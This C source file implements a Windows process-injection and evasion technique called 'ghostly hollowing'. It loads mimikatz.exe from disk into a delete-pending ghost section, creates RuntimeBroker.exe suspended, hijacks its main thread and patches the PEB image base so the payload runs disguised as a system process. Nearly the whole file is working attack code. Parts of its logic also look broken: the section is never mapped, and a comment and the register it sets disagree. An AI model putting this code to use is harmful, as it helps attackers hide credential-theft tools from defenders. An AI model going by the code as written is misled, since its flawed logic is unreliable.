/*
    * Ghostly Hollowing
    - Hybird technique between Process Hollowing and Porcess Ghosting. In process ghosting, a ghost section was used to create the remote process using the NtCreateProcessEx syscall.
    - In ghostly hollowing the created section will be mapped into a normally created Windows process. This is then followed by patching the ImageBaseAddress member of the PEB structure.
    - The PE payload entry point is executed by hijacking the main thread of the created process.
 */



#include <Windows.h>
#include <stdio.h>
#include "Structs.h"

#define Alloc(SIZE)				LocalAlloc(LPTR, (SIZE_T)SIZE)
#define Free(BUFF)				LocalFree((LPVOID)BUFF)
#define ReAlloc(BUFF, SIZE)		LocalReAlloc(BUFF, SIZE,  LMEM_MOVEABLE | LMEM_ZEROINIT)
#define pWinError(szWnApiName)			    printf("[!] %s Failed With Error: %d \n", szWnApiName, GetLastError());
#define pNtError(szNtApiName, NtErr)		printf("[!] %s Failed With Error: 0x%0.8X \n", szNtApiName, NtErr);
#define DELETE_HANDLE(H)								\
if (H != NULL && H != INVALID_HANDLE_VALUE){		\
CloseHandle(H);									\
H = NULL;										\
}

typedef struct _NTAPIFP
{
    fnNtWriteFile					pNtWriteFile;
    fnNtCreateSection				pNtCreateSection;
    fnNtMapViewOfSection			pNtMapViewOfSection;
    fnNtGetContextThread			pNtGetContextThread;
    fnNtSetThreadContext			pNtSetContextThread;
    fnNtWriteVirtualMemory			pNtWriteVirtualMemory;
    fnNtResumeThread				pNtResumeThread;
    fnNtOpenFile					pNtOpenFile;
    fnNtSetInformationFile			pNtSetInformationFile;

} NTAPIFP, * PNTAPIFP;


NTAPIFP		g_NtApi = { 0x00 };

// Function fetch payload from disk
// Parameter: zsFileName            -> Hold the specified PE payload file
// Parameter: ppFileBuffer          -> Dereference the buffer, effectively assign the buffer address toe output parameter
// Parameter: pdwFilzeSize          -> Holds size of the specified PE payload file in bytes
BOOL ReadPePayload(_In_ LPWSTR szFileName, _Out_ PBYTE* ppFileBuffer, _Out_ DWORD* pdwFileSize) {
    HANDLE		hFile				                    = INVALID_HANDLE_VALUE;
    PBYTE		pTmpReadBuffer		                    = NULL;
    DWORD		dwFileSize, dwNumberOfBytesRead			= (DWORD) 0;

    // Check if parameters are valid
    if (!szFileName || !ppFileBuffer || !pdwFileSize)
        return FALSE;

    // Open the specified PE payload file
    if ((hFile = CreateFileW(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        pWinError(L"CreateFileW");
        return FALSE;
    }

    // Get the filesize (in bytes)
    if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
        pWinError(L"GetFileSize");
        goto _CleanUp;
    }

    // Allocate memory for the specified PE file
    if (!(pTmpReadBuffer = Alloc(dwFileSize))) {
        pWinError(L"LocalAlloc");
        goto _CleanUp;
    }

    // Read the PE file from disk
    if (!ReadFile(hFile, pTmpReadBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
        pWinError(L"ReadFile");
        goto _CleanUp;
    }

    // Assigning values to output parameters
    *ppFileBuffer = pTmpReadBuffer;
    *pdwFileSize = dwFileSize;

_CleanUp:
    DELETE_HANDLE(hFile);
    if (pTmpReadBuffer && !*ppFileBuffer)
        Free(pTmpReadBuffer);
    return *ppFileBuffer == NULL ? FALSE : TRUE;
}


// Function: Calculates the address of the entry point of the payload and prepares for execution.
// Parameter: pFileBuffer   -> Pointer to the buffer containing the Portable Executable (PE) payload.
DWORD EntryPointExecute(_In_ PBYTE pFileBuffer) {
    // Retrieve the pointer to the NT headers of the PE file.
    PIMAGE_NT_HEADERS  pImgNtHdrs = (PIMAGE_NT_HEADERS)(pFileBuffer + ((PIMAGE_DOS_HEADER)pFileBuffer)->e_lfanew);

    // Check if the PE file has the correct signature.
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return 0x00; // Return 0x00 if the signature is not valid.

    // Return the address of the entry point of the PE file.
    return pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
}

// Function: Initializes a UNICODE_STRING structure.
// Parameter: UsStruct      -> Pointer to the UNICODE_STRING structure to be initialized.
// Parameter: Buffer        -> Optional pointer to a wide character string to be copied into the buffer member.
VOID RtlInitUnicodeString(_Out_ PUNICODE_STRING UsStruct, _In_ OPTIONAL PCWSTR Buffer) {

    // If the input string buffer is not null
    if ((UsStruct->Buffer = (PWSTR)Buffer)) {

        // Calculate the length of the string and ensure it fits within the maximum allowed length.
        unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
        if (Length > 0xfffc) // Limit length to avoid buffer overflow.
            Length = 0xfffc;

        // Set the length and maximum length of the UNICODE_STRING structure.
        UsStruct->Length = Length;
        UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
    }

    // If the input string buffer is null, set the length and maximum length to zero.
    else UsStruct->Length = UsStruct->MaximumLength = 0;
}

// Function: Create ghost section from .tmp file that will contain PE paylaod
// Parameter: szFileName            -> Full path to created tmp file
// Parameter: pFileBuffer           -> Base address PE payload
// Parameter: dwFileSize            -> Size of PE payload (in bytes)
// Parameter: phGhostSection        -> Pointer that will receive the address of the ghost section handle
BOOL CreateGhostSection(_In_ LPWSTR szFileName, _In_ PVOID pFileBuffer, _In_ DWORD dwFileSize, _Out_ HANDLE* phGhostSection) {
    HANDLE							hFileHandle	= INVALID_HANDLE_VALUE,  // File handle for the temporary file.
                                    hSection	= NULL;                 // Handle for the created ghost section.
    NTSTATUS						STATUS		= STATUS_SUCCESS;       // Status of NT API calls.
    UNICODE_STRING					uFileName	= { 0x00 };             // Unicode string for the file name.
    OBJECT_ATTRIBUTES				ObjectAttr	= { 0x00 };             // Object attributes for file operations.
    IO_STATUS_BLOCK					StatusBlock	= { 0x00 };             // IO status block for file operations.
    FILE_DISPOSITION_INFORMATION	FileDispInfo = { .DeleteFile = TRUE }; // Information to delete the temporary file after use.
    LARGE_INTEGER					ByteOffset	= { 0x00 };             // Byte offset for file write operations.

    if (!szFileName || !pFileBuffer || !dwFileSize || !phGhostSection)
        return FALSE;

    // Initialize Unicode string with the provided file name.
    RtlInitUnicodeString(&uFileName, szFileName);
    // Initialize object attributes for file operations.
    InitializeObjectAttributes(&ObjectAttr, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Open the temporary file with delete permissions.
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtOpenFile(&hFileHandle, (DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE), &ObjectAttr, &StatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT)))) {
        pNtError(TEXT("NtOpenFile"), STATUS);
        goto _CleanUp;
    }

    // Set file disposition information to delete the file after closing it.
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtSetInformationFile(hFileHandle, &StatusBlock, &FileDispInfo, sizeof(FILE_DISPOSITION_INFORMATION), FileDispositionInformation)))) {
        pNtError(TEXT("NtSetInformationFile"), STATUS);
        goto _CleanUp;
    }

    // Write the PE payload to the temporary file.
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteFile(hFileHandle, NULL, NULL, NULL, &StatusBlock, pFileBuffer, dwFileSize, &ByteOffset, NULL)))) {
        pNtError(TEXT("NtWriteFile"), STATUS);
        goto _CleanUp;
    }

    // Create a section object from the temporary file.
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hFileHandle)))) {
        pNtError(TEXT("NtCreateSection"), STATUS);
        goto _CleanUp;
    }

    // Assign the handle of the created ghost section to the output parameter.
    *phGhostSection = hSection;

_CleanUp:
    DELETE_HANDLE(hFileHandle);
    if (!*phGhostSection) {
        DELETE_HANDLE(hSection);
    }
    return *phGhostSection ? TRUE : FALSE; // Return success or failure based on section handle.
}

// Function: Fetches the offset of the entry point from the provided PE file buffer.
// Parameters:          -> pFileBuffer: Pointer to the base address of the PE file buffer.
DWORD FetchEntryPntOffset(IN PBYTE pFileBuffer) {
    // Calculate the pointer to the IMAGE_NT_HEADERS structure using the e_lfanew field of the IMAGE_DOS_HEADER.
    PIMAGE_NT_HEADERS   pImgNtHdrs = (PIMAGE_NT_HEADERS)(pFileBuffer + ((PIMAGE_DOS_HEADER)pFileBuffer)->e_lfanew);

    // Check if the PE file signature is valid.
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return 0x00; // Return 0 if the PE signature is invalid.

    // Return the offset of the entry point from the OptionalHeader.
    return pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
}


// Function: Hijacks remote function execution by modifying the context of a specified thread.
// Parameter: hProcess              -> Handle to the target process.
// Parameter: hThread               -> Handle to the thread whose context will be modified.
// Parameter: pRemoteBaseAddr       -> Base address of the remote module in the target process.
// Parameter: dwEntryPointRVA       -> Relative Virtual Address (RVA) of the entry point within the remote module.

BOOL HijackRemoteFunctionExecution(_In_ HANDLE hProcess, _In_ HANDLE hThread, _In_ PVOID pRemoteBaseAddr, _In_ DWORD dwEntryPointRVA) {
    NTSTATUS		STATUS			= STATUS_SUCCESS; // Status of NT API calls.
    CONTEXT			Context			= { .ContextFlags = CONTEXT_ALL }; // Thread context structure.
    LPVOID			pRemoteImgBase  = NULL; // Pointer to the remote process's PEB.ImageBase.

    // Getting current thread context.
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtGetContextThread(hThread, &Context)))) {
        pNtError(TEXT("NtGetContextThread"), STATUS);
        return FALSE;
    }

    // Set the Rip register to the entry point of the remote module.
    Context.Rcx		= (DWORD64)((ULONG_PTR)pRemoteBaseAddr + dwEntryPointRVA);

    // Getting offset of the PEB.ImageBase struct (process hollowing).
    pRemoteImgBase = (LPVOID)(Context.Rdx + offsetof(PEB, ImageBase));

    // Set the modified context back to the target thread.
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtSetContextThread(hThread, &Context)))) {
        pNtError(TEXT("NtSetContextThread"), STATUS);
        return FALSE;
    }

    printf("[*] >>  New Image Base Address: 0x%p \n", pRemoteBaseAddr);

    // Write the payload's ImageBase into the remote process's PEB.
    if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, pRemoteImgBase, &pRemoteBaseAddr, sizeof(ULONGLONG), NULL)))) {
        pNtError(TEXT("NtWriteVirtualMemory"), STATUS);
        return FALSE;
    }

    return TRUE;
}

BOOL CreateGhostHollowedProcess(_In_ LPWSTR szLegitPeImg, _In_ HANDLE hGhostSection, _In_ PBYTE pPayloadBuffer) {
    BOOL					bResult				= FALSE;
    NTSTATUS				STATUS				= STATUS_SUCCESS;
    STARTUPINFOW			StartupInfo			= { 0x00 };
    PROCESS_INFORMATION		ProcessInfo			= { 0x00 };
    SIZE_T					sViewSize			= (SIZE_T)NULL;
    PVOID					pBaseAddress		= NULL;
    PWCHAR					pwcDuplicateStr		= NULL,
                            pwcLastSlash		= NULL;
    DWORD					dwEntryPntRVA		= 0x00;

    // Clean up heap
    RtlSecureZeroMemory(&StartupInfo, sizeof(STARTUPINFOW));
    RtlSecureZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));

    // Set size of strucure the size of STARTUPINFOW structure (effecively set the size big enough for the entire structure.
    StartupInfo.cb	= sizeof(STARTUPINFOW);

    if (!(pwcDuplicateStr = _wcsdup(szLegitPeImg)))
        return FALSE;

    // Null termination
    if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
        *pwcLastSlash = L'\0';

    if (!CreateProcessW(NULL, szLegitPeImg, NULL, NULL, TRUE, (CREATE_SUSPENDED | CREATE_NEW_CONSOLE), NULL, pwcDuplicateStr, &StartupInfo, &ProcessInfo)) {
        pWinError(TEXT("CreateProcessW"));
        goto _CleanUp;
    }

    printf("[*] >>  Ghost Process Created With PID: %lu \n", ProcessInfo.dwProcessId);

    if (!(dwEntryPntRVA = FetchEntryPntOffset(pPayloadBuffer)))
        goto _CleanUp;

    if (!HijackRemoteFunctionExecution(ProcessInfo.hProcess, ProcessInfo.hThread, pBaseAddress, dwEntryPntRVA))
        goto _CleanUp;

    if (!NT_SUCCESS((STATUS = g_NtApi.pNtResumeThread(ProcessInfo.hThread, NULL)))) {
        pNtError(TEXT("NtResumeThread"), STATUS);
        goto _CleanUp;
    }

    printf("[+] >> Thread [%lu] IS Hijacked To Run Payload!\n", GetThreadId(ProcessInfo.hThread));

    bResult = TRUE;

    _CleanUp:
    if (pwcDuplicateStr)
        free(pwcDuplicateStr);
    DELETE_HANDLE(ProcessInfo.hProcess);
    DELETE_HANDLE(ProcessInfo.hThread);
    DELETE_HANDLE(hGhostSection);
    return bResult;
}

#define		PE_FILE			L"C:\\Users\\Development\\Downloads\\mim\\mimikatz.exe"
#define		LEGIT_IMG		L"C:\\Windows\\system32\\RuntimeBroker.exe coffee"

int main() {

	HMODULE		hNtdll				= NULL;
	PBYTE		pFileBuffer			= NULL;
	DWORD		dwFileSize			= 0x00,
				dwEntryPntRVA		= 0x00;
	HANDLE		hGhostSection		= NULL;

	WCHAR		szTmpFileName[MAX_PATH]			= { 0x00 };
	WCHAR		szTmpPath[MAX_PATH]				= { 0x00 };
	WCHAR		szTmpFilePath[MAX_PATH * 2]		= { 0x00 };
	WCHAR		szLegitWindowsBin[MAX_PATH * 2] = LEGIT_IMG;

	if (!(hNtdll = GetModuleHandle(TEXT("NTDLL"))))
		return -1;

	g_NtApi.pNtOpenFile					= (fnNtOpenFile)GetProcAddress(hNtdll, "NtOpenFile");
	g_NtApi.pNtWriteFile				= (fnNtWriteFile)GetProcAddress(hNtdll, "NtWriteFile");
	g_NtApi.pNtSetInformationFile		= (fnNtSetInformationFile)GetProcAddress(hNtdll, "NtSetInformationFile");
	g_NtApi.pNtCreateSection			= (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	g_NtApi.pNtWriteVirtualMemory		= (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	g_NtApi.pNtMapViewOfSection			= (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	g_NtApi.pNtGetContextThread			= (fnNtGetContextThread)GetProcAddress(hNtdll, "NtGetContextThread");
	g_NtApi.pNtSetContextThread			= (fnNtSetThreadContext)GetProcAddress(hNtdll, "NtSetContextThread");
	g_NtApi.pNtResumeThread				= (fnNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");


	if (!g_NtApi.pNtWriteFile			|| !g_NtApi.pNtCreateSection		|| !g_NtApi.pNtMapViewOfSection		||
		!g_NtApi.pNtResumeThread		|| !g_NtApi.pNtSetInformationFile	|| !g_NtApi.pNtGetContextThread		||
		!g_NtApi.pNtSetContextThread	|| !g_NtApi.pNtWriteVirtualMemory	|| !g_NtApi.pNtOpenFile
	){
		return -1;
	}

	//-------------------------------------------------------------

	// Get Temp Dir Path
	if (GetTempPathW(MAX_PATH, szTmpPath) == 0x00) {
		pWinError(TEXT("GetTempPathW"));
		return -1;
	}

	// Create A Temp File (Named szTmpFileName)
	if (GetTempFileNameW(szTmpPath, L"GH", 0x00, szTmpFileName) == 0x00) {
		pWinError(TEXT("GetTempFileNameW"));
		return -1;
	}

	// Convert To NT path format
	wsprintf(szTmpFilePath, L"\\??\\%s", szTmpFileName);

	printf("[*] >>  Created Tmp Path: %ws \n", szTmpFilePath);

	//-------------------------------------------------------------

	// Read PE Payload From Disk
	if (!ReadPePayload(PE_FILE, &pFileBuffer, &dwFileSize))
		return -1;

	//-------------------------------------------------------------

	// Create Ghost Section
	if (!CreateGhostSection(szTmpFilePath, pFileBuffer, dwFileSize, &hGhostSection))
		return -1;

	printf("[*] >>  Ghost Section Is Created: 0x%0.8X \n", hGhostSection);

	//-------------------------------------------------------------

	// Create Ghost Process With The Ghost Section
	if (!CreateGhostHollowedProcess(szLegitWindowsBin, hGhostSection, pFileBuffer))
		return -1;

	return 0;
}